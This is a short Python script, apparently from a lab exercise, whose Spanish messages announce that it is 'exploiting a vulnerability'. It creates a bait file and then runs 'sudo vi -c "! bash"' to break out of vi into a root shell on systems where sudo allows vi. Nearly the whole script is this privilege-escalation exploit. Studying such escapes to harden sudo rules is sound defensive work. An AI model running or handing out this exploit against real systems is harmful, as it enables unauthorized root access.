def PruebaSUDO():
  import os
  import os.path

  if os.path.isfile('/home/user2files2/file1.txt'):
        print("El archivo ansuelo existe ... Explotando vulnerabilidad")
        os.system('sudo vi -c "! bash" file1.txt')
  else:
        os.system('touch /home/user2files2/file1.txt')
        print("Archivo creado ... Ejecutar el programa otra vez")

PruebaSUDO()
